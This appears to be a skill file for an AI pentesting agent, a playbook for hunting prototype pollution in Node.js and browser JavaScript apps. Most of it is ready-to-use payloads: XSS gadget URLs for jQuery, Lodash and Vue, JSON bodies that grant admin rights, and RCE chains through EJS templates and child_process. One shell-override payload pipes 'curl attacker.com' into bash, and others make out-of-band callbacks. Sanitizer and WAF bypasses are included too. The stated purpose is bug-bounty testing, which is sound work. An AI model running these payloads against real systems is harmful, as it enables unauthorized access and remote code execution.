---
name: prototype-pollution
description: "Prototype pollution hunting — client-side PP via URL params with XSS gadgets (jQuery/Lodash/Vue/Backbone), server-side PP via JSON merge for auth bypass/RCE (child_process.fork execArgv, EJS/Pug template injection, shell override). Use when testing Node.js/Express applications, SPAs with deep merge, or JSON APIs with object merge endpoints."
---

# Prototype Pollution

## Crown Jewel Targets

- **Express.js APIs with JSON body merge** — `__proto__` in POST body → `isAdmin: true` auth bypass → full admin access (Critical)
- **Node.js apps with EJS/Pug templates** — server-side PP → template injection → RCE via `outputFunctionName` gadget (Critical)
- **SPAs using vulnerable Lodash versions** (< 4.17.12) — client-side PP via URL → `sourceURL` gadget → XSS
- **jQuery-heavy legacy frontends** (< 3.4.0) — `$.extend(true, ...)` with URL-controlled objects → DOM XSS
- **Express apps spawning child processes** — server-side PP → `execArgv` pollution → `--eval` RCE on next `fork()`
- **Settings/preferences APIs** with deep merge — user profile update with `__proto__` → pollute all subsequent requests
- **npm packages using `minimist`/`qs`/`flat`** — query string parsing creates nested objects from `__proto__[key]=value`

## Attack Surface Signals

- **URL patterns**: `?__proto__[test]=1`, `?constructor.prototype.test=1`, JSON APIs with `/api/settings`, `/api/profile`, `/api/merge`
- **JS bundle patterns**: `_.merge(`, `_.defaultsDeep(`, `$.extend(true,`, `Object.assign(`, `deepCopy(`, `deepMerge(`
- **Response patterns**: Express `json spaces` in response formatting changes, unexpected 555 status codes, charset changes in Content-Type
- **Tech stack signals**: Node.js/Express (X-Powered-By: Express), package.json with lodash/jQuery/hoek/minimist/qs/flat
- **Error messages**: `Cannot read property of undefined` (after pollution breaks prototype chain)
- **Positive indicators**: `({}).test === "polluted"` in browser console after URL injection, response format changes after JSON injection

## Overview

Prototype pollution allows attacker to inject properties into `Object.prototype`, affecting all JavaScript objects. Two variants:
- **Client-side PP**: Via URL params/hash → XSS gadgets → script execution
- **Server-side PP**: Via JSON body → RCE, auth bypass, privilege escalation

## Detection

### 1. Client-side PP (via URL)
```bash
# Test common PP vectors in URL
# Check if __proto__ is processed
https://target.com/page?__proto__[test]=polluted
https://target.com/page?__proto__.test=polluted
https://target.com/page?constructor.prototype.test=polluted
https://target.com/page#__proto__[test]=polluted

# Verify in browser console:
# Navigate to URL above, then check:
# ({}).test === "polluted"  // true = vulnerable
```

### 2. Server-side PP (via JSON merge)
```http
POST /api/user/settings HTTP/1.1
Content-Type: application/json

{"__proto__": {"isAdmin": true}}
```

```http
POST /api/merge HTTP/1.1
Content-Type: application/json

{"constructor": {"prototype": {"isAdmin": true}}}
```

### 3. Automated detection
```bash
# ppfuzz / ppmap for client-side
# Manual: check JS for dangerous merge/extend functions
grep -rniE "(\.merge\(|\.extend\(|deepCopy|deepMerge|Object\.assign)" target_js/
grep -rniE "(lodash|underscore|jquery).*\.(merge|extend|defaultsDeep)" target_js/
```

## Client-Side PP → XSS Gadget Chains

### Common gadgets (libraries that read from prototype)

| Library | Gadget | Payload |
|---------|--------|---------|
| **jQuery** | `$.fn.init` | `?__proto__[div][0]=1&__proto__[div][1]=<img/src/onerror=alert(1)>` |
| **Lodash < 4.17.12** | `template` | `?__proto__[sourceURL]=alert(1)` |
| **Backbone.js** | Model defaults | `?__proto__[defaults][script]=data:,alert(1)` |
| **Vue.js** | v-bind | `?__proto__[v-bind:class]=alert(1)` |
| **Closure** | `goog.html` | `?__proto__[*]=[xss]` |
| **Sanitize-HTML** | allowedTags bypass | `?__proto__[allowedTags][0]=script` |
| **Embedly** | Cards | `?__proto__[onload]=alert(1)` |

### Universal PP→XSS PoC template
```html
<!DOCTYPE html>
<html>
<body>
<script>
// Step 1: Pollute prototype
Object.prototype.innerHTML = '<img src=x onerror=alert(document.domain)>';
// Step 2: Trigger gadget (library-specific)
// For generic: any code that creates element with default properties
</script>
</body>
</html>
```

## Server-Side PP → Impact Chains

### A. Auth bypass / Privilege escalation
```json
// If app checks user.isAdmin (which is undefined by default)
{"__proto__": {"isAdmin": true, "role": "admin"}}

// If app uses allowList pattern
{"__proto__": {"allowedActions": ["admin:delete", "admin:modify"]}}
```

### B. RCE via child_process
```json
// If app spawns child processes with options from merged config
{"__proto__": {"shell": true, "argv0": "node -e 'require(\"child_process\").execSync(\"id\")''"}}

// Via NODE_OPTIONS
{"__proto__": {"env": {"NODE_OPTIONS": "--require=/proc/self/environ"}}}
```

### C. DoS via toString/valueOf
```json
{"__proto__": {"toString": {"length": 1}, "valueOf": {"length": 1}}}
// Causes TypeError on any string conversion
```

### D. Template injection via PP
```json
// EJS template engine
{"__proto__": {"outputFunctionName": "x;process.mainModule.require('child_process').execSync('id');s"}}

// Pug/Jade
{"__proto__": {"block": {"type": "Text", "val": "x]});process.exit()//"}}}
```

## Vulnerable Libraries (check package.json / yarn.lock)

| Library | Vulnerable Versions | Function |
|---------|-------------------|----------|
| lodash | < 4.17.12 | `_.merge`, `_.defaultsDeep`, `_.set` |
| jQuery | < 3.4.0 | `$.extend(true, ...)` |
| hoek | < 5.0.3 | `hoek.merge` |
| minimist | < 1.2.6 | Argument parsing |
| qs | < 6.10.3 | Query string parsing |
| express | query parser | `req.query.__proto__` |
| flat | < 5.0.1 | `unflatten` |
| mpath | < 0.8.4 | `mpath.set` |

## Exploitation Flow

```
1. Identify merge/extend point (URL params, JSON body, query string)
   ↓
2. Confirm pollution: inject test property, verify in response/behavior
   ↓
3. Client-side: Find XSS gadget in loaded libraries
   Server-side: Test auth bypass → RCE → template injection
   ↓
4. Chain to demonstrated impact (XSS, account takeover, RCE)
```

## Detection tooling and the sources people miss

**DOM Invader does prototype pollution.** Burp's embedded browser has a dedicated PP mode that automatically finds both **sources** (URL and JSON entry points that reach a merge) and **gadgets** (polluted properties the page actually reads). It reports the exact property path and generates the PoC URL. Manual `__proto__` fuzzing is the fallback, not the starting point — the automated pass takes a minute and finds paths that manual review misses.

**Browser API sources.** Pollution does not only arrive through application code:
- `fetch()` — a polluted prototype can inject request options (headers, method, body) into every fetch the page makes, because the options object inherits what you polluted.
- `Object.defineProperty()` — code that uses it defensively can still be subverted, since a polluted prototype supplies the descriptor defaults.

**Bypassing flawed key sanitization.** Filters that strip `__proto__` once are defeated by nesting (`__pro__proto__to__` collapses back to `__proto__` after a single strip) or by routing through `constructor.prototype` instead. Test both before accepting that a target is patched.

**Server-side detection via polluted property reflection.** The easiest server-side check: pollute a property with a distinctive value and look for it **reflected back in the JSON response**, because many frameworks serialise inherited properties. `{"__proto__":{"zqx7k1":"canary"}}` followed by any response containing `zqx7k1` is immediate confirmation, and it costs one request. Only when nothing reflects do you need the blind techniques (status code override, JSON spaces, charset) covered below.

## Impact Requirements

**Client-side PP alone = usually rejected**. Must chain to:
- XSS via gadget (proven alert/cookie theft)
- DOM manipulation leading to phishing

**Server-side PP** must demonstrate:
- Auth bypass (prove admin access)
- RCE (prove command execution)
- Data manipulation (prove state change)

## Triage Checklist

- [ ] Pollution confirmed (property appears on clean objects)
- [ ] Impact chain demonstrated (not just "Object.prototype modified")
- [ ] For client-side: XSS gadget identified and triggered
- [ ] For server-side: auth bypass or RCE proven
- [ ] Tested with latest browser / Node.js version
- [ ] Verified target uses vulnerable library version

## PortSwigger Academy — Advanced Techniques

### Server-Side Blind Detection — Status Code
- Inject `{"__proto__":{"status":555}}` via JSON body to a merge/update endpoint
- Then trigger any error (e.g., request a nonexistent route) — if HTTP 555 is returned, pollution is confirmed
- Express uses `res.status(err.status || 500)` — polluted `status` property on prototype propagates

### Server-Side Blind Detection — JSON Spaces
- Inject `{"__proto__":{"json spaces":10}}` — Express uses this option in `res.json()`
- Subsequent JSON responses will have 10-space indentation instead of compact format
- Works on Express < 4.17.4 — confirms pollution without needing error-based feedback

### Server-Side Blind Detection — Charset Override
- Inject `{"__proto__":{"content-type":"application/json; charset=utf-7"}}`
- Then send a request with UTF-7 encoded body like `+AGYAbwBv-` — if server interprets it as UTF-7, charset was polluted
- Useful for confirming pollution when no visible behavior change otherwise

### RCE via child_process.fork() execArgv
- `{"__proto__":{"execArgv":["--eval=require('child_process').execSync('curl COLLAB.oastify.com')"]}}`
- When the app calls `child_process.fork()`, the polluted `execArgv` injects `--eval` into the spawned Node process
- The child process executes the attacker's code before running its intended script

### RCE via Shell Override
- `{"__proto__":{"shell":"vim","input":":! curl attacker.com | bash\n"}}`
- Overrides the default shell for `child_process.exec()`/`execSync()` — next command execution uses vim as shell
- Vim interprets `:!` as shell escape, executing the attacker's command

### OOB Detection via NODE_OPTIONS
- `{"__proto__":{"shell":"node","NODE_OPTIONS":"--inspect=COLLAB.oastify.com"}}`
- When a child process spawns with `node`, `--inspect` causes it to connect to the attacker's server
- DNS/HTTP callback confirms pollution + code execution context

### constructor.prototype Bypass
- When `__proto__` is sanitized/filtered, use `{"constructor":{"prototype":{"isAdmin":true}}}` instead
- `obj.constructor.prototype` is the same reference as `obj.__proto__` — both reach `Object.prototype`
- Many sanitizers only check for `__proto__` key and miss `constructor.prototype` path

### Recursive Sanitization Bypass
- Input: `__pro__proto__to__` — sanitizer strips the inner `__proto__`, leaving `__proto__` reconstructed
- Double-nesting defeats single-pass sanitization: `__pro__proto__to__` → strip → `__proto__`
- Test multiple nesting levels if sanitizer runs multiple passes

### URL-Based Pollution via Query String
- `?__proto__[transport_url]=data:,alert(1);//` — pollutes via query string parsing (qs library)
- Trailing `//` comments out any suffix appended by the application (e.g., `/script.js`)
- Effective for client-side PP when URL params flow through vulnerable parsers

## Operator Notes (Battle-Tested)

1. **Server-side blind detection via `json spaces` is the fastest confirmation**: Send `{"__proto__":{"json spaces":10}}` to any JSON merge endpoint. If subsequent responses have 10-space indentation, pollution is confirmed. Works on Express < 4.17.4 without any visible error.
2. **Always try `constructor.prototype` when `__proto__` is filtered**: Many sanitizers only block the `__proto__` key. `{"constructor":{"prototype":{"isAdmin":true}}}` reaches the same `Object.prototype` via a different path.
3. **Client-side PP alone is NOT reportable**: You must chain to XSS via a gadget. Identify which libraries are loaded (jQuery, Lodash, Vue, etc.) and use the matching gadget from the table. "I can pollute Object.prototype" without impact is rejected.
4. **Check `package.json` / `yarn.lock` for vulnerable versions**: Lodash < 4.17.12, jQuery < 3.4.0, hoek < 5.0.3, minimist < 1.2.6, qs < 6.10.3. If the target uses these versions, PP vectors are highly likely in merge/extend functions.
5. **RCE via `child_process.fork()` + `execArgv` is the highest-impact server-side chain**: Pollute `execArgv` with `["--eval=require('child_process').execSync('curl COLLAB')"]`. The next `fork()` call spawns a node process with your code. Confirm with interactsh OOB callback.

## Related Skills & Chains

| When | Go to |
|------|-------|
| Client-side PP → need XSS gadget | `xss-testing` |
| Server-side PP → auth bypass confirmed | `access-control-testing` |
| Server-side PP → RCE via template injection | `ssti-testing` |
| PP via query string parsing | `hidden-param-discovery` |
| WAF blocks `__proto__` keyword | `waf-bypass` → `references/waf-generic-evasion.md` |
| PP in API merge endpoint | `api-security-testing` |
